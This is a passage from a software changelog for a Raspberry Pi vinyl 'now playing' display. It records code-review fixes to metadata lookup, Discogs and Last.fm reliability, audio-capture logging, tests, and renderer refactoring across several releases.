  never tried. The per-release handler now classifies with the shared
  `metadata.errors.is_transient` taxonomy: a **transient** failure (MusicBrainz
  unreachable/timeout — `NetworkError`) re-raises to abort the lookup (the whole
  service is down; trying more releases would just hammer it), while any other
  per-release failure (a `ResponseError`/404 or `AuthenticationError` for that
  MBID, or a malformed payload) skips to the next candidate. `is_transient` was
  extended to know `musicbrainzngs.NetworkError` is transient (MusicBrainz is
  urllib-based, so its errors aren't `requests` types); its siblings
  `ResponseError`/`AuthenticationError` are deliberately left non-transient.
  Cover art is a best-effort fallback, so an unexpected per-release error
  degrades to skip→`None` (logged at debug) rather than a loud abort — a
  deliberate, documented posture for this non-critical untrusted-payload path.
  RED-first; mutation-verified; independently cold-reviewed (SPEC + QUALITY PASS;
  blast-radius clean — the other `is_transient` callers use it only for log level).
- **A blacklisted cover is no longer re-decoded for palette every track change
  (#165 — LOW).** When `_load_cover` gives up on an undecodable cover,
  `_handle_corrupt_cover` deliberately leaves the bad bytes on disk on the final
  (blacklisting) attempt. But `_on_state_change` still spawned `_prefetch_cover`
  for the playing track on each state change, and for a blacklisted-but-on-disk
  cover that skipped the download (the file exists) yet still called
  `_extract_palette_async`, which re-attempted a Pillow decode on the same bad
  bytes and logged one `Palette extraction failed` WARNING — once per
  `set_track`, i.e. per track change. `_prefetch_cover` now early-returns for a
  URL in `_cover_bad_urls` (matching the blacklist check `_extract_palette_async`
  already had), so a given-up cover does no re-download and no re-decode. A
  genuinely new cover is still lifted from the blacklist by `_on_state_change`
  *before* the prefetch task is spawned, so it keeps its fresh decode attempt.
  RED-first; mutation-verified.
- **A non-creditable album-split no longer takes the finalize lock (#166 —
  LOW).** CONC-2 moved end-of-session crediting off the lifecycle lock, but
  `on_track_identified`'s album-split path still `await`ed `_finalize_detached`
  inline on the recognition pipeline, and it took `_finalize_lock`
  *unconditionally* — so a split commit could briefly stall the audio queue
  behind an unrelated in-flight credit, even for the common mid-album swap whose
  split-off session never reached its last track and has nothing to credit or
  love. The split now finalizes only when `detached.potential_last_track` — a
  necessary condition for both the Play Count credit and the Last.fm love, so a
  non-creditable split does no write anyway and is short-circuited before the
  lock, keeping the queue draining. A genuinely creditable split (its closer
  played right before the swap) still finalizes and takes the lock as required;
  the SESSION_ENDED path (fire-and-forget, never awaited on the pipeline) is
  deliberately left unchanged and keeps its "last track not reached" log.
  RED-first; mutation-verified; independently cold-reviewed (SPEC + QUALITY PASS
  — verified `potential_last_track` gates every write, so only logging is
  skipped, and it's the tightest correct gate).

- **Startup-abort now closes the thread pools instead of leaking them to atexit
  (#170 — LOW).** If `build_components` (e.g. an unwritable cover-art cache dir)
  or `start_display` (no HDMI / X down) raised before `run_pipeline` was entered,
  `run_pipeline`'s cleanup `finally` — which closes the dedicated Discogs pool
  (#61) and the owned I/O executor (CRIT-3) — never ran, leaving both to
  `concurrent.futures`' atexit join. `main()`'s startup body is now wrapped in a
  `try/finally` gated by a `started_pipeline` flag: on the pre-`run_pipeline`
  abort path it closes the `io_executor` (and the `DiscogsHttp` pool, if
  components were built); once `run_pipeline` is entered it owns cleanup, so the
  gate prevents any double close. Behaviour on the normal path is unchanged.
  RED-first (both abort paths); mutation-verified (including a guard pinning the
  no-double-close gate); independently cold-reviewed (SPEC + QUALITY PASS — the
  re-indent is statement-for-statement identical to before).

### Security

- **Assessed and documented the cover-fetch header-drip residual as accepted
  (#176 — LOW, not reproduced).** SEC-4 (#121) bounds a slow-drip cover fetch
  with a 45s wall-clock budget, but that budget is a Python-level check between
  blocking calls (between redirect hops, between body `read1()` chunks) — it
  cannot interrupt the synchronous response-HEADER parse inside `pool.urlopen()`,
  which is bounded only by the per-recv 15s socket timeout. A host that dribbles
  headers one byte per sub-15s recv can still stall a single hop past the budget
  (the SEC-4 body-drip DoS class, in the header path). Deliberately NOT fixed:
  reaching it requires a rogue allow-listed host or a MITM on the SSRF-pinned IP
  (the S-7 allow-list + IP pin + TLS hostname check gate both); the worst case on
  this single-user appliance is "covers stop loading," not data loss; and it was
  never reproduced. The only complete fix (a watchdog thread closing the socket
  at the deadline) adds more concurrency risk than the hypothesis warrants here,
  so it's recorded as a known, accepted residual in `cover_cache.py` (revisit if
  reproduced, or if the fetch moves somewhere multi-tenant). No behaviour change.

- **Throttled the capture-loop retry-error log (#178 — LOW).** After #164 moved
  the device lookup inside the retry loop, a *permanent* failure (a misconfigured
  `audio.device_name` that never matches, or a device absent forever) raises on
  every retry — at ~1 error per `_STREAM_RETRY_BACKOFF_SECONDS` (1s) that flooded
  the journal/SD card, the same PCONC-4 class the drop-warning already guards
  against, on the error path. `AudioCapture` now logs the capture error through a
  throttled helper: the first error — and any error whose message *changes* (a
  new condition worth surfacing at once) — logs immediately, while identical
  repeats are counted and summarized at most once per 30s. RED-first;
  mutation-verified. (Filed from the #164 cold review.)

### Removed

- **Deleted the dead `clamp_luminance` helper and its tests (#177 — LOW).**
  Wave 4's DISP-1 (#125) replaced `extract_palette`'s use of
  `palette.clamp_luminance` (a perceived-brightness clamp that could not brighten
  a pure-black or already-saturated accent) with `ensure_contrast_hue_preserving`.
  That was its only production caller, leaving `clamp_luminance` dead in `src/` —
  defined in `src/display/palette.py`, imported nowhere in `src/`, and exercised
  only by three tests in `tests/test_renderer_caches.py`. Verified dead by
  `grep -rn clamp_luminance src/ tests/` before removing the function and those
  three tests; a comment in `tests/test_palette_contrast.py` that named it was
  reworded. Full suite still green (943 → 940, the three removed tests).

## [1.5.6] — 2026-08-07

**Code-review hardening, round 3 (Wave 5 — metadata, Discogs reliability &
the audio pipeline).** Wave 5 of the same audit (`CODE_REVIEW_2026-07-30.md`):
tightening how a track's position within its album is parsed and ranked,
closing gaps in the Discogs read/write layer, covering the audio-capture safety
net that has never run on real hardware, hardening the recognizer/silence
path against malformed Shazam responses and cross-session state bleed, and
tightening the entry-point lifecycle (Last.fm thread-safety, shutdown coverage,
log disk caps), and clearing docs / dependency / test-hygiene debt (a config-
reference gap, an unjustified dep, a tautological test, and the first CI to run
the suite on push), and a round of renderer/architecture cleanups (display-type
relocation, injection seams, dead-code + docstring + type-annotation fixes).

### Fixed

- **The side ordinal now follows the pressing's track *numbers*, not the order
  Discogs happens to list the rows in (META-8 #150 — LOW).** `side_position`
  was the 1-indexed *row* position of the track among its side-mates as they
  appear in the tracklist array. Discogs rows are community-edited and not
  guaranteed to be in sequence, so a release whose A-side is listed `[A2, A1]`
  rendered `A1` as **"02 OF 02"** — a position greater than its own track
  number, and the wrong number outright. `side_position` is now the rank of the
  track after sorting its side by the parsed track number, so `A1` reads
  **"01 OF 02"** regardless of row order and the `NN OF MM` caption stays
  coherent (N ≤ M) for out-of-sequence and gapped sides alike. `side_total`
  (the side's length) is unchanged.
- **Separated and space-padded vinyl positions now parse (META-9 #151 —
  LOW).** `_SIDE_RE` matched only the tight `A1` / `B12` / `AA3` forms, so the
  common Discogs variants `A-1`, `A.1`, `A 1` (and a stray-whitespace `A1 `)
  fell through to a bare raw-position display with no side letter, ordinal, or
  total — no `SIDE A · …` caption at all. The pattern now tolerates a single
  `-`/`.`/space separator and surrounding whitespace, and `track_display` is
  stripped so a padded row renders a clean caption. The side-letter run is
  bounded to one or two letters (`A`..`Z`, doubled `AA`/`BB`), so — crucially —
  word-label rows a release may carry (`Video 1`, `Bonus 2`, `Disc 1`) do **not**
  fabricate a `SIDE VIDEO` caption: like a bare letter `A` (no number) or a
  CD-style `1-01` (leading digit), they degrade gracefully to a raw-position
  display with no fabricated side. `is_last_track` — the sole gate on the
  Discogs Play Count write — is derived from the position+title `global_index`
  and never touched `_SIDE_RE`, so it is unaffected by the relaxed parsing.
  (The word-label bound was added in the adversarial cold-review pass, which
  caught that the whitespace tolerance alone would have newly matched
  `Video 1`.)

### Changed

- **Removed a redundant, provably-inert re-scan in `SideIndex.from_tracklist`
  (MUT-16 #136 — MEDIUM).** The factory recomputed the global-index anchor
  (`target_position`) with a second side-filtered loop over the tracklist, then
  fell back to the current entry's own position. Because the current entry is
  the first row matching the title and is by construction the first title match
  within its own side group, that loop *always* yielded exactly the fallback —
  a 120,000-case fuzz over relaxed-format and duplicate-position tracklists
  found 0 divergence. It is replaced by the single expression it always equalled
  (`target_position = current.position if current else None`). Behavior is
  identical, including the deliberately conservative reprise handling: a title
  repeated across sides resolves to its *first* occurrence, so a genuine closer
  that duplicates an earlier title stays `is_last_track = False` (a missed play
  count, never a phantom one). The `from_tracklist` docstring, which had
  credited a "side filter disambiguates" mechanism that no longer exists, is
  corrected to describe the actual first-occurrence logic. RED-first; adversarial
  cold review (no crash / no data-integrity defect; one introduced regression
  found and fixed, one degenerate nit declined).

The Discogs-reliability cluster (Unit 2):

### Fixed

- **A routine Discogs 429/5xx during a collection search is now classified
  transient instead of "unexpected bug" (META-6 #149 — LOW).** The reader's
  search/release/master calls go through the python3-discogs-client library,
  which raises its OWN `discogs_client.exceptions.HTTPError` for a non-2xx
  status — a type that does **not** inherit from
  `requests.exceptions.RequestException` (verified via its MRO). The
  transient/permanent taxonomy listed only the `requests` families, so a
  routine rate-limit or gateway error was mis-classified as non-transient and
  logged as "Unexpected error in Discogs collection search" — erasing exactly
  the routine-vs-defect distinction the taxonomy exists to provide for an
  operator reading the journal after an unattended overnight run. Added
  `discogs_client.exceptions.HTTPError` to `TRANSIENT_EXTERNAL_ERRORS` and
  corrected the module docstring's false "the Discogs client is requests-based"
  claim. RED-first (the new test was red before the tuple change); mutation-
  verified.

### Changed

- **The live Discogs smoke test moved out of the test namespace and got a
  public API seam (CRIT-6 #133 — MEDIUM).** `test_discogs_live.py` — a 226-line,
  `test_`-prefixed script at the repo root that hits the real Discogs API (and,
  with `--test-write`, increments a Play Count in the operator's live
  collection) — was only kept out of `pytest` by a `conftest.py` `collect_ignore`
  hack, one config edit away from a live-network write landing in CI. It is now
  `scripts/discogs_live_check.py` (outside `testpaths=tests`, no `test_` prefix,
  so `pytest` never collects it — verified with `--collect-only`), the
  `collect_ignore` workaround is deleted, and the six doc references were
  updated. It also reached into the writer's private `_get_collection_fields()`
  from outside the package, so a writer refactor would silently break the
  operator's first-boot smoke test; a public `DiscogsCollectionWriter.
  get_collection_fields()` facade was added and the script now calls that. (The
  other half of CRIT-6 — a real unit test for the field-ID map, closing MUT-1 —
  was already satisfied by prior-wave tests.)
- **The Discogs transport's identifying default headers are now pinned by a
  test (MUT-12 #135 — MEDIUM).** Only the `Authorization` header was implicitly
  exercised; `User-Agent`, `Content-Type` and their values survived string
  mutation. Discogs returns HTTP 403 to any request without an identifying
  `User-Agent` — a failure that only ever surfaces the first time the Pi touches
  the real API, which this project weights higher. A test now asserts the exact
  default header dict on `DiscogsHttp` construction, including a non-empty
  `User-Agent`; a refactor that drops or renames it turns the suite red
  (mutation-verified against empty, renamed, and removed UA).
- **Clarified that the scrobble timestamp shares the Last Played clock gate
  (CRIT-9 #148 — LOW).** The finding noted that META-5 cited only `writer.py`
  for "bogus scrobble timestamps," while the scrobble timestamp is actually
  captured in `track_commit_service.py`. The code already gates both
  date-dependent writes with `clock_is_trustworthy` (STAB-2) and both are
  tested; this adds an in-code cross-reference at the timestamp capture so a
  triager following the cite finds the scrobble path. (No behavioural change.)

### Fixed (nit)

- **Removed a stale hardcoded sample date from a `writer.py` comment (STAB-7
  #161 — NIT).** `# e.g. "2026-05-24"` beside `date.today()` became the generic
  `# ISO 8601, e.g. "YYYY-MM-DD"`.

The audio-capture cluster (Unit 3a):

### Fixed

- **The audio block-drop warning is now a throttled health signal instead of a
  per-drop log flood (PCONC-4 #153 — LOW).** When the event loop stalls, the
  capture callback's drop-oldest overflow fired one WARNING per dropped block —
  ~4/second, and a single stalled loop turn was measured emitting 53 records,
  flooding the Pi's SD-card journal in exactly the degraded state where writes
  are most precious. `_enqueue_block` now counts drops and emits at most one
  summarizing warning per `_DROP_WARN_INTERVAL_SECONDS` (5s) reporting the
  aggregate since the last report. The drop-oldest behaviour itself is
  unchanged (oldest evicted, newest admitted). The report clock is seeded to
  `-inf` so the very first drop always warns regardless of the monotonic epoch
  — the Pi's `CLOCK_MONOTONIC` is uptime-based and resets to ~0 on reboot, so a
  naive `0.0` seed would have swallowed the first warning during early boot
  (caught in adversarial cold review). RED-first; mutation-verified.

### Tests

- **The audio capture safety net is now covered headless (TQ-7 #138 — MEDIUM).**
  `AudioCapture._silence_ticker()` — the wall-clock task that keeps
  `SESSION_ENDED` firing (and the Discogs Play Count credited) while the stream
  is down — and `run()`'s stream-construction-retry path had zero tests, on
  hardware that has never been powered on. Three headless tests were added
  (pure asyncio + a mocked `InputStream`): the ticker keeps ticking and
  survives a listener that raises; a construction failure is retried with a
  fresh stream; and `run()`'s `finally` cancels + awaits the ticker on exit.
  All three are mutation-verified against the exact branch they cover. No
  production code change — the paths already worked; they simply weren't pinned.
- **Centralized the `sounddevice` import stub with proper teardown (TQ-6
  #156 — LOW).** `sys.modules.setdefault("sounddevice", MagicMock())` sat at
  module scope in `test_capture.py` and `test_main_wiring.py` and was never
  restored, leaking a `MagicMock` into `sys.modules` for the rest of the
  process where any later test could silently pick it up. It now lives in the
  root `conftest.py` (installed before any test module imports, `setdefault`
  semantics preserved so a real PortAudio install is untouched) with a
  `pytest_sessionfinish` hook that removes only a stub it planted. Consequence,
  by design: the two test modules are no longer bare-`import`-able outside a
  pytest run (they were only ever run under pytest).

The recognizer/silence cluster (Unit 3b):

### Fixed

- **A JSON-null album section no longer discards an otherwise-valid track
  identification (REC-5 #154 — LOW).** Shazam returns the album under an
  optional `sections`/`metadata` structure, and a response with `"sections":
  null` (or `"metadata": null`) made `_parse_shazam`'s album lookup raise
  `TypeError` — which `recognize()`'s broad except then swallowed, discarding a
  correct title AND artist as a plain miss (six such chunks in a row would show
  "NO MATCH FOUND" for a track Shazam identified every time). The lookup now
  guards `track.get("sections") or []` / `section.get("metadata") or []` (a
  present-but-null key returns `None`, not the `.get` default) and is wrapped in
  its own try/except so any other malformed album shape logs and leaves the
  album blank rather than sinking the match. RED-first; mutation-verified
  (the clean null-guard path and the last-resort try/except are pinned
  separately).
- **A track's confirmation health counters no longer carry across a needle lift
  (PCONC-3 #152 — LOW).** `_miss_count` (which gates the LISTENING "NO MATCH
  FOUND" screen) and `_churn_count` (the churn breadcrumb) persisted across a
  session boundary, so a fresh side inherited the previous side's streak and
  could surface ERROR on fewer of its own chunks. They now reset when a chunk's
  session epoch differs from the last (a `_last_epoch` check); epochs only
  increase and chunks are handled oldest-first, so it fires once per real
  boundary. (The *pending* candidate was already voided across a boundary by
  the earlier REC-1-review logic — measured — so this closes the remaining
  miss/churn half.) RED-first; mutation-verified.

### Changed

- **`_same_track` is now genuinely whitespace-insensitive, as its docstring
  always claimed (REC-4 #159 — NIT).** It normalized only leading/trailing
  whitespace, so Shazam's subtly different internal spacing for the same track
  ("My  Song" vs "My Song") compared unequal and forced a needless
  re-resolve / re-scrobble — the exact churn the docstring said it prevented.
  It now normalizes with `" ".join(s.split()).casefold()`, collapsing internal
  whitespace runs and folding case Unicode-aware. RED-first; mutation-verified.
- **Corrected the `AudioEvent.MUSIC_STOPPED` documentation (SIL-3 #155 — LOW).**
  Its comment called it an "inter-track gap," but RMS is computed over the whole
  ~15s window, so a 2–6s gap between tracks stays far above threshold and can
  never trip it — the event only fires when the entire window goes quiet, which
  arms the end-of-session timer. The inline comment and the class docstring now
  describe that accurately (and note the member currently has no external
  consumer — it is the internal music→silence transition marker). Kept over
  deleting the member (Lane's call): zero test churn and it remains a semantic
  hook. Comment-only, no behaviour change.

The entry-point & lifecycle cluster (Unit 4):

### Fixed

- **The shared Last.fm client is now thread-safe across its two callers
  (CRIT-10 #145 — LOW).** One `LastFmClient` is injected into both
  `TrackCommitService` (which calls `scrobble` via `run_in_executor`) and
  `ListenTracker` (which calls `love` via `run_in_executor`), so two executor
  threads could hit the single pylast `Network` object at the same time (a
  session-end love overlapping a fresh scrobble), and pylast documents no
  thread-safety guarantee — worst case a lost scrobble. `scrobble()` and
  `love()` now serialize their `Network` access behind a `threading.Lock` held
  only around the pylast call (not the logging or the return). A
  `threading.Lock`, not the finding's suggested `asyncio.Lock`: the guarded
  calls run on executor threads, off the event loop, where an `asyncio.Lock`
  wouldn't apply. RED-first; mutation-verified (a 16-thread stress probe in
  cold review confirmed strict serialization and clean release on exceptions).

### Tests

- **`main()`'s startup guard and shutdown wiring are now covered (TQ-2 #137 —
  MEDIUM).** The config-error guard and the SIGINT/SIGTERM handler registration
  were entirely untested (the helpers extracted from `main()` were tested, but
  not `main()`'s own body). Two headless tests were added: a `ConfigError` from
  `load_config` yields `SystemExit(1)`, and `main()` registers a handler for
  both signals with the `_cancel_all` closure that cancels every pipeline task.
  No production change — `main.py` already did the right thing; it simply wasn't
  pinned.

### Documentation

- **Documented capping journald disk usage on the Pi (STAB-6 #160 — NIT).** The
  app logs to stderr → journald with no explicit disk ceiling, and journald's
  default rate-limit burst (10,000/30s) sits above the app's worst observed log
  rate, so a rare warning storm accumulates rather than being dropped. Added a
  `journald.conf.d` drop-in recipe (`SystemMaxUse`/`RuntimeMaxUse` +
  tightened `RateLimit*`) to `docs/pi-setup-guide.md`. This is the systemd-native
  place to bound log disk on an unattended appliance; the app already throttles
  its own repeating warnings in code (the cover-decode blacklist), so this is
  the belt-and-suspenders disk ceiling. Docs-only.

The docs / deps / test-hygiene cluster (Unit 6):

### Added

- **CI now runs the full test suite on every push (TQ-9 #157 — LOW).** There was
  no CI running the ~900 tests — only a badge-sync workflow — so a regression
  could reach the appliance unnoticed. Added `.github/workflows/tests.yml`
  running `pytest` on a pinned Python 3.11 (the target's and the sandbox's
  version), with `SDL_VIDEODRIVER=dummy` so pygame runs headless and no
  PortAudio system package needed (the `sounddevice` import is stubbed in
  `conftest.py`). The Python-version constraint is also now declared at the top
  of `requirements.txt`.

### Changed

- **`requirements.txt` cleanup (TQ-9 #157 — LOW).** Dropped `aiohttp` — nothing
  in `src/` imports it directly (it is pulled transitively by `shazamio`), and
  it carried none of the justifying comments the other direct-dependency pins
  do. Added `pytest-cov`, which the documented `pytest --cov` coverage command
  needs but which was undeclared.

### Fixed

- **Replaced a tautological test assertion (TQ-8 #162 — NIT).**
  `test_error_status_exists` asserted `PlayerStatus.ERROR is not None`, which can
  never fail (an enum member reached by attribute access is never `None`). It now
  asserts a falsifiable property — `ERROR` is a real `PlayerStatus` member named
  `"ERROR"` with a value distinct from every other member (guards an accidental
  rename or alias). Mutation-verified.

### Documentation

- **Documented `display.reduced_motion` in the config reference (ARCH-5 #141 —
  LOW).** It was the only `config.yaml` field missing from the "Configuration
  reference" table in `docs/architecture.md`, so the documented way to quiet the
  display's animations on a struggling Pi was invisible unless you read the
  prose. Added the row.

Three audit-completeness findings (CRIT-7 #134, CRIT-8 #147, CRIT-11 #146) were
resolved by verification rather than code and closed with documented outcomes on
their issues: the remediated SPEC findings (MUT-16, SIL-3, REC-4, DISP-1/2) were
re-checked against the real `DESIGN.md`/`testing-guide.md` and all hold; TQ-1's
"every renderer test bypasses `__init__`" was confirmed overstated (and its
coverage gap already closed by the `test_renderer_lifecycle.py` remediation); and
the prior concurrency pass's findings (PCONC-3/PCONC-4) were confirmed already
reconciled and shipped earlier in Wave 5.

The renderer/architecture cleanup cluster (Unit 5a):

### Changed

- **`DisplayPalette` + `FALLBACK_PALETTE` moved to the display layer (ARCH-7
  #143 — LOW).** They are pure display value objects with no consumer anywhere
  in `src/metadata`, yet lived in `src/metadata/models.py` — so the display layer
  imported *up* into the model layer for a display-owned type, making the "deps
  point inward" rule unfalsifiable. Moved to `src/display/palette.py` beside
  `extract_palette`, with the ~8 importers rewired. No re-export from `models`
  (the finding's guidance: add one only if a non-display consumer ever appears).
  Behaviour-preserving; verified no circular import.
- **Three collaborators gained an optional injection seam (ARCH-8 #144 — LOW).**
  `DisplayRenderer` (CoverArtCache), `MetadataResolver` (CoverArtFallback) and
  `RecognitionLoop` (the recognition backend) each constructed their collaborator
  internally, so tests had to monkeypatch the private attribute afterwards. Each
  now takes an optional constructor parameter (`cover_store` / `coverart` /
  `backend`) defaulting to the current concrete — a substitute can be injected
  directly, and production (which passes nothing) is byte-for-byte unchanged.
  Chosen over full composition-root relocation (Lane's call): the minimal seam
  the finding named, without the larger refactor that overlaps the deferred
  ARCH-3 split. `x if x is not None else Concrete()` (not truthiness) so a
  legitimately falsy injected double is never discarded. RED-first; mutation-
  verified.

### Fixed

- **Removed a dead fallback in `_draw_genre_chips` (ARCH-9 #158 — NIT).**
  `chips_rect` defaulted to `None` and fell back to `layout.genre_chips`, but the
  sole caller and every test always pass a rect — the branch was provably dead
  and advertised a chip-positioning mode the push-down layout would place wrong.
  `chips_rect` is now a required parameter and the branch is gone; a test pins
  that omitting it fails loudly.
- **Type-annotated the renderer's uninitialised Surface handles (ARCH-6 #142 —
  LOW).** `_screen`, `_gradient_surface`, `_shadow_surface` (Surfaces) and
  `_arc_segment` (a `(key, surface)` tuple) initialise to `None` with no
  annotation, so a type checker infers their type *is* `None` and flags every
  real later assignment — removing type-checking from exactly the four pygame
  handles that are `None` before `start()`. Annotated them `Optional[...]` (plus
  the sibling `_static_surface`, a fifth handle the original finding missed —
  caught in cold review) with a `TYPE_CHECKING`-only `pygame` import so the
  forward-refs resolve. Annotate-only (Lane's call): a `mypy.ini`/CI ratchet on a
  pygame/CFFI codebase was deferred as its own deliberate decision. No runtime
  change (string forward-refs are never evaluated).
- **Corrected the `_font` docstring (ARCH-4 #140 — LOW).** It claimed a TTF is
  "opened once per (role, size) and held forever," but the font cache has been a
  bounded LRU (`_FONT_CACHE_MAX`, cap 64) since P-8. Reworded to match; a
  maintainer trusting "held forever" might probe many sizes per frame assuming
  zero eviction cost.

The God-object split, part 1 of 2 (Unit 5b — ARCH-3 #139, subset scope):

### Changed

- **Extracted `TextRenderer` out of `DisplayRenderer` (ARCH-3 #139 — the first
  of two facade-delegation splits).** All font loading + text layout — `font`,
  `render_tracked`, `break_long_token`, `wrap_lines`, `fit_wrapped`, `ellipsize`,
  `draw_wrapped_text`, `measure_wrapped_text`, plus the `_FONT_DIR`/`_FONT_FILES`/
  `_SYSFONT_FALLBACKS` constants — now lives in a new `src/display/typography.py`
  as a standalone `TextRenderer` class. This is pure layout logic that shared no
  state with the render loop yet could previously only be reached through a
  pygame-initialised `DisplayRenderer`; it now has its own module and its own
  standalone unit tests (`tests/test_typography.py`, 12 cases) that build a
  `TextRenderer` over two bounded caches with **no renderer, no display surface,
  no `__new__`-skeleton**. `DisplayRenderer` composes one `TextRenderer` and
  delegates via thin shims, so its public/private method surface is byte-for-byte
  unchanged and every existing renderer test still passes. The font + label LRU
  caches stay **owned by the renderer** and are injected into the engine, so cache
  bounds and eviction are identical to before; the engine is built lazily from the
  renderer's own caches and rebinds if a test swaps a cache out (pinned by
  `test_text_engine_rebinds_when_cache_is_swapped`), so the `__new__`-skeleton
  tests keep working. `renderer.py` shrank ~1700 → ~1534 lines. Scope was Lane's
  call: ARCH-3 is being addressed as a two-patch subset (TextRenderer, then
  `PaletteTransition`), with the `FramePainter`/`CoverPipeline` extraction
  deferred and documented on the issue — those carry the most render-loop
  coupling and the least testability payoff, and lack a pixel-diff harness to
  refactor against safely. Behaviour-preserving; RED-first; mutation-verified;
  independently cold-reviewed (which caught a dead `pathlib.Path` import and a
  missing cache-invalidation guard, both fixed before delivery).
- **Extracted `PaletteTransition` out of `DisplayRenderer` (ARCH-3 #139 — the
  second of the two subset splits; closes the issue).** The 1-second palette
  cross-fade on track change — its interpolation, per-frame quantization (P-4),
  same-target skip (v1.3.5), and snap-to-live-value-before-retarget behaviour —
  plus the `_lerp_color`/`_lerp_palette`/`_quantize_palette` helpers and the
  `_TRANSITION_SECS`/`_PALETTE_LERP_QUANTIZE` constants now live in a new
  `src/display/palette_transition.py` as a standalone `PaletteTransition` class,
  with its own standalone unit tests (`tests/test_palette_transition.py`, 12
  cases) that build the state machine over a bare cache with **no renderer, no
  pygame, no display surface**. `DisplayRenderer` composes one and delegates
  `_queue_palette`/`_animated_palette` via thin shims; `_current_palette`,
  `_target_palette` and `_transition_start` remain reachable as delegating
  properties, so the render loop and every `__new__`-skeleton test are unchanged
  (90 existing palette-touching assertions across five test files still pass
  untouched). The engine captures **no** renderer state — the palette cache and
  `dynamic_theming` flag stay renderer-owned and are passed into `queue()` per
  call — so, unlike the `TextRenderer` split, the lazy engine needs no
  cache-swap rebind guard. Behaviour-preservation was verified by a 3000-trial
  randomized equivalence harness against a faithful re-implementation of the
  pre-split inline state machine (0 mismatches on `animated()` output and all
  three state fields), plus the full suite green. RED-first; four-mutant
  gauntlet (same-target skip, snap-before-retarget, quantization, theming guard)
  all killed; independently cold-reviewed (SPEC + QUALITY PASS; caught one dead
  `FALLBACK_PALETTE` import, fixed).
- **ARCH-3 (#139) resolved as a documented subset.** With `TextRenderer` and
  `PaletteTransition` extracted, `renderer.py` is down from ~1700 to ~1518 lines
  (~180 lines / two whole responsibilities lifted into focused modules) and its
  two most cohesive, pure-logic responsibilities are now independently
  unit-testable. The remaining `FramePainter` (frame composition) and
  `CoverPipeline` (async cover fetch/decode) extractions are **deliberately
  deferred** and documented on the issue: they carry the heaviest render-loop
  and event-loop coupling, the least testability payoff, and — critically — lack
  a pixel-diff / integration harness to refactor against safely, so splitting
  them now would be high-risk churn. The God-object is materially reduced;
  #139 is closed as substantially addressed with the deferral recorded.

## [1.5.5] — 2026-08-06

**Code-review hardening, round 3 (Wave 4 — display correctness & the contrast
guarantee).** Wave 4 of the same audit (`CODE_REVIEW_2026-07-30.md`): making the
"4.5:1 on all text" promise actually true on the panel nobody has switched on
yet.

### Fixed

- **The album title is now guaranteed readable — the accent it's drawn in is
  contrast-clamped, and every text role is clamped against the gradient it
  actually sits on, not flat bg (DISP-1 #125 + DISP-2 #126 — MEDIUM).** The
  album title, divider and genre-chip borders are all drawn in `accent`, but
  `accent` only passed through `clamp_luminance` — a perceived-brightness clamp
  that cannot brighten a pure-black or already-saturated color at all — while
  the real WCAG `ensure_contrast` was applied to `muted` alone. A matte-black
  sleeve gave `accent (0,0,0)` vs `bg (8,8,8)` = **1.05:1**; 34/62 covers
  measured below 4.5:1. Compounding it, *all* clamping was computed against flat
  `bg`, but text is blitted on a radial gradient whose brightest pixel is
  `lerp(bg, surface, 0.55)` ≈ `bg×1.33`, so even `muted` (clamped to 4.5:1 vs
  `bg`) measured **3.99:1** on the gradient. Now a single `text_background(bg,
  surface)` — the gradient's brightest pixel, via the new shared
  `GRADIENT_TEXT_PEAK` constant the gradient itself draws with — is the clamp
  target for both text roles, in `extract_palette` and in the per-frame
  re-clamp during the 1s lerp. `accent` is lifted to 4.5:1 by a new
  `ensure_contrast_hue_preserving` that raises HLS lightness while keeping the
  cover's hue (the smallest move that reaches the floor, so a red title stays
  red instead of washing pink) — chosen over blend-to-white for the artwork
  color; `muted` (a neutral grey) keeps blend-to-white. Scope covers the single
  `accent` role, so the divider and chips — also invisible on dark sleeves —
  become legible in the same move. Verified on the reproduced covers (black
  album, saturated blue/yellow, deep red) plus a low-contrast dark-blue; all
  clear 4.5:1 on the gradient after, none before. DESIGN.md and the CLAUDE.md
  "4.5:1 on all text" wording corrected to match (resolving the contradiction
  the finding named). RED-first; cold review SPEC / QUALITY PASS.
- **Cover images decode once instead of twice on first render (#173 — LOW,
  DISP-3 follow-up).** `validate_image_file` gained an opt-in `return_image`;
  `extract_palette` reuses the image the validator already decoded rather than
  re-opening and decoding the same file, halving the per-cover decode cost
  (once per unique album; the palette is memoized by URL). The validate-only
  download path is unchanged.
- **Non-Latin metadata no longer renders as reversed / mis-spaced glyphs
  (DISP-5 #129 — LOW).** `_render_tracked` drew every label one codepoint at a
  time with a manual advance to apply letter-spacing — which silently destroys
  text shaping for complex scripts (Arabic joining, Devanagari conjuncts,
  floating combining marks, emoji ZWJ clusters). It draws the meta footer
  (year · label · catalog) and the genre chips, both fed by stranger-editable
  Discogs free text, so a Japanese/Arabic/Cyrillic label name came out as
  unshaped, mis-spaced, possibly reversed glyphs. ASCII labels keep their exact
  designed tracking; any non-ASCII string is now rendered as a single shaped run
  (letting SDL_ttf shape it) with no manual tracking. RED-first; cold review
  SPEC / QUALITY PASS.
- **A run-on title or artist name no longer runs off the right edge of the
  screen (DISP-7 #131 — LOW).** `_wrap_lines` emitted any single token wider
  than the column as one un-broken line (and `_fit_wrapped` can't shrink a
  one-token line below the point it fits), while `_draw_wrapped_text` blitted
  with no horizontal clip — so a 120-character unbroken Discogs title was
  truncated by the display edge rather than the layout. Over-wide tokens are now
  character-broken into fitting chunks (consistent with the existing
  shrink-not-ellipsis product decision — the whole string still shows, wrapped),
  and the blit is clipped to the column width as a backstop for the residual
  single-glyph-wider-than-column case. `_wrap_lines` stays the single source of
  truth shared by drawing and measurement, so they can't disagree. Verified no
  character is lost, duplicated, or reordered, and the wrap terminates even on a
  degenerate zero/negative width. RED-first; cold review SPEC / QUALITY PASS.
- **The accent divider scales uniformly, and the docs stop over-claiming pure
  proportional scaling (DISP-6 #130 — LOW).** `layouts.py` scaled
  `divider_width` by the horizontal `sx` while every font uses the uniform `s =
  min(sx, sy)`, so on a wide/ultrawide panel the fixed-size "punctuation-mark"
  divider stretched far past its proportional size (215px at 3440×1440); it now
  tracks `s` like the fonts. Separately, `CLAUDE.md`/`DESIGN.md` claimed the
  renderer "scales every constant proportionally" with "no hard-coded
  breakpoints," but `layouts.py` has seven `max(floor, …)` font-size floors, so
  below ≈`s=0.33` fonts hold their minimum while rects keep shrinking. Decision
  (Lane, 2026-08-06): **keep the floors** as a legibility guard and correct the
  docs — they now state that scaling is proportional down to the floors, name
  1024×600 (`s=1.0`, floors inactive) as the supported reference, and stop
  claiming pure proportionality. No behavior change at the shipped resolution.
